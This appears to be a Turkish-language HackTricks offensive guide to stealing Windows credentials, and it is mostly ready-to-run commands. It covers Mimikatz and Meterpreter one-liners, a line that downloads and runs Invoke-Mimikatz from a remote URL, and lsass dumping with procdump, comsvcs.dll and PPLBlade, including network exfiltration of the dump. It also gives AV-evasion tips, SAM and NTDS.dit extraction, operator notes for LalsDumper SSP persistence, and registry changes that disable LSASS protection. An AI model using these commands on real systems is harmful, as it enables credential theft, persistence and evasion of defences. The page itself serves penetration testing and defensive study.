# Windows Credentials Çalma

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'ın yapabileceği diğer şeyleri [**this page**](credentials-mimikatz.md) sayfasında bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Burada bazı olası credentials korumalarını öğrenin.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı credentials'ları çıkarmasını engelleyebilir.**

## Meterpreter ile Credentials

Benim oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **benim oluşturduğum** eklentiyi kullanarak hedef içinde **passwords and hashes** arayabilirsiniz.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) tarafından sağlanan **Procdump**, meşru bir Microsoft aracı olduğu için Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass** sürecinin dump'ını alabilir, dump'ı indirip dump'tan yerel olarak **credentials** çıkarabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV**'ler **procdump.exe ile lsass.exe dökme** kullanımını **kötü amaçlı** olarak **tespit edebilir**; bunun nedeni **"procdump.exe" and "lsass.exe"** stringlerini **tespit etmeleridir**. Bu nedenle procdump'a lsass.exe'nin **adını** vermek **yerine** **PID**'ini **argüman** olarak **geçirmek** daha **gizlidir**.

### **comsvcs.dll** ile lsass dökümü

`C:\Windows\System32`'de bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dökme** işinden sorumludur. Bu DLL, `MiniDumpW` adlı bir **fonksiyon** içerir ve `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmıştır.\
İlk iki argümanın kullanımı önemsizdir, ancak üçüncü argüman üç bileşene ayrılmıştır. Dökülecek işlemin PID'si birinci bileşeni oluşturur, döküm dosyasının konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra, DLL döküm dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.\
**comsvcs.dll**'in kullanımı, lsass işlemini dökmek için uygundur ve böylece procdump'ı yükleyip çalıştırma ihtiyacını ortadan kaldırır. Bu yöntem detaylı olarak şu adreste açıklanmıştır: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

Çalıştırmak için aşağıdaki komut kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci otomatikleştirebilirsiniz** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager ile lsass dökme**

1. Görev Çubuğuna sağ tıklayın ve Task Manager'a tıklayın
2. More details'a tıklayın
3. Processes sekmesinde "Local Security Authority Process" işlemini arayın
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file"e tıklayın.

### procdump ile lsass dökme

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft tarafından imzalanmış bir binary olup [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçasıdır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass dökme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) Protected Process Dumper aracı olup, bellek dökümünü disk üzerine bırakmadan gizleme (obfuscation) ve uzak iş istasyonlarına aktarma desteği sağlar.

**Temel işlevler**:

1. PPL korumasını baypas etme
2. Bellek döküm dosyalarını Defender'ın imza tabanlı tespit mekanizmalarından kaçınmak için gizleme (obfuscating)
3. Bellek dökümünü RAW ve SMB upload yöntemleriyle disk üzerine bırakmadan yükleme (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP tabanlı LSASS dökümü MiniDumpWriteDump çağırmadan

Ink Dragon üç aşamalı, **LalsDumper** adını taşıyan bir dumper dağıtır; bu dumper asla `MiniDumpWriteDump` çağırmaz, bu nedenle EDR'in o API'ye koyduğu hook'lar hiç tetiklenmez:

1. Aşama 1 yükleyicisi (`lals.exe`) – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt`'nin mutlak yolu ile üzerine yazar, yamalanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağırır. Bu, **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini sağlar.
2. Aşama 2 (LSASS içinde) – LSASS `nfdp.dll`'i yüklediğinde, DLL `rtu.txt`'i okur, her byte'ı `0x20` ile XOR'lar ve yürütmeyi aktarmadan önce dekode edilmiş blob'u belleğe yerleştirir.
3. Aşama 3 dumper – belleğe yerleştirilen payload, hashed API isimlerinden çözülen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dump'ını dosyaya yazar ve handle'ı kapatarak exfiltration'ın daha sonra gerçekleşmesine olanak tanır.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt`'yi aynı dizinde tutun. Aşama 1, sabitlenmiş yer tutucuyu `rtu.txt`'nin mutlak yolu ile yeniden yazar; bu yüzden dosyaları ayırmak zinciri bozar.
* Kayıt, `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` anahtarına `nfdp` eklenmesiyle yapılır. LSASS'in her önyüklemede SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz ayarlayabilirsiniz.
* %TEMP%\*.ddt dosyaları sıkıştırılmış dump'lardır. Yerelde açın, sonra credential extraction için bunları Mimikatz/Volatility'ye verin.
* `lals.exe`'yi çalıştırmak admin/SeTcb hakları gerektirir ki `AddSecurityPackageA` başarılı olsun; çağrı döndüğünde LSASS kötü amaçlı SSP'yi şeffaf şekilde yükler ve Aşama 2'yi yürütür.
* DLL'i diskten silmek onu LSASS'ten çıkarmaz. Ya kayıt girdisini silip LSASS'i yeniden başlatın (reboot) ya da uzun vadeli persistence için bırakın.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit dökümü
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump NTDS.dit parola geçmişini hedef DC'den
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM'i Çalma

Bu dosyalar **şu konumlarda** bulunur: _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ Ancak **bunları normal bir şekilde kopyalayamazsınız** çünkü korunmuşlardır.

### Kayıt Defteri'nden

Bu dosyaları çalmanın en kolay yolu, Kayıt Defteri'nden bir kopyasını almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
Bu dosyaları Kali makinenize **Download** edin ve şu komutla **extract the hashes**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların kopyasını alabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aynısını **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasını nasıl kopyalayacağınıza** dair bir örnektir (kullanılan sabit disk "C:" ve kaydedildiği yer C:\users\Public) ancak bunu herhangi bir korumalı dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptan alınan kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanarak SAM, SYSTEM ve ntds.dit dosyalarının kopyalarını alabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası **Active Directory**'nin kalbi olarak bilinir; kullanıcı nesneleri, gruplar ve üyelikleri hakkında önemli veriler barındırır. Etki alanı kullanıcılarının **password hashes**'leri burada depolanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** yolunda bulunur.

Bu veritabanı içinde üç ana tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesnelere ait detayları saklamaktan sorumludur.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesne için **Security descriptors** burada tutulur; saklanan nesnelerin güvenliğini ve erişim kontrolünü sağlar.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows bu dosya ile etkileşim için _Ntdsa.dll_ kullanır ve bu, _lsass.exe_ tarafından kullanılır. Daha sonra, **NTDS.dit** dosyasının bir kısmı `lsass` belleği içinde bulunabilir (muhtemelen en son erişilen verileri bulabilirsiniz; performansı artırmak için **cache** kullanımı nedeniyle).

#### NTDS.dit içindeki hash'lerin çözülmesi

Hash 3 kez şifrelenmiştir:

1. Password Encryption Key (**PEK**) **BOOTKEY** ve **RC4** kullanılarak çözülür.
2. **hash** **PEK** ve **RC4** kullanılarak çözülür.
3. **hash** **DES** kullanılarak çözülür.

**PEK**, **her domain controller**'da **aynı değere** sahiptir, ancak **NTDS.dit** dosyası içinde domain controller'ın **SYSTEM** dosyasının **BOOTKEY**'i kullanılarak **şifrelenmiştir** (domain controller'lar arasında farklıdır). Bu nedenle NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM** dosyalarına ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanılarak NTDS.dit'in kopyalanması

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit'den hashes çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettiğinizde**, _secretsdump.py_ gibi araçları **hashes'i çıkarmak için** kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli domain admin user kullanarak **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit** dosyaları için, onu çıkarmak üzere [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanmanız önerilir.

Son olarak, ayrıca **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.

### **NTDS.dit dosyasından domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece secrets değil; ham NTDS.dit dosyası zaten elde edildiğinde, tüm nesneler ve onların öznitelikleri de çıkarılır ve bu da daha fazla bilgi çıkarımı için kullanılabilir.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive isteğe bağlıdır ancak gizli verilerin şifresinin çözülmesine izin verir (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Bunun yanı sıra aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ve bunların hash'leri, UAC flags, son oturum açma ve parola değişikliği zaman damgaları, hesap açıklamaları, adlar, UPN, SPN, gruplar ve rekürsif üyelikler, organizational units ağacı ve üyelikleri, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Bu binary'i çeşitli yazılımlardan kimlik bilgisi çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. İndirmek için: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından credentials çıkar
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**; parolalar çıkarılacaktır.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT, herhangi bir red-teamer için kullanışlı teknikler içeren `DumpRDPHistory` tasker'ını içerir:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – her kullanıcı hive'ini `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altında çözümleyin. Her alt anahtar sunucu adını, `UsernameHint`'i ve son yazma zaman damgasını saklar. FinalDraft’in mantığını PowerShell ile çoğaltabilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` logunu Event ID'leri **21** (başarılı oturum açma) ve **25** (disconnect) için sorgulayarak kimin makinaya yönetici erişimi verdiğini eşleyin:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin'in düzenli olarak bağlandığını öğrendikten sonra, onların **bağlantısı kesilmiş** oturumu hâlâ varken LSASS'i (LalsDumper/Mimikatz ile) dump'layın. CredSSP + NTLM fallback, verifier ve token'larını LSASS'ta bırakır; bunlar SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya etki alanı denetleyicilerinde persistence kurulabilir.

### Registry downgrades targeted by FinalDraft

The same implant also tampers with several registry keys to make credential theft easier:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarı, RDP sırasında tam kimlik bilgisi/bilet yeniden kullanımını zorlar; pass-the-hash tarzı pivotlamalara olanak tanır.
* `LocalAccountTokenFilterPolicy=1` UAC token filtresini devre dışı bırakır; böylece yerel yöneticiler ağ üzerinden kısıtlamasız token'lar alır.
* `DSRMAdminLogonBehavior=2` DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin verir; bu da saldırganlara başka bir yerleşik yüksek ayrıcalıklı hesap sağlar.
* `RunAsPPL=0` LSASS PPL korumalarını kaldırır; LalsDumper gibi dumper'lar için bellek erişimini kolaylaştırır.

## Referanslar

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
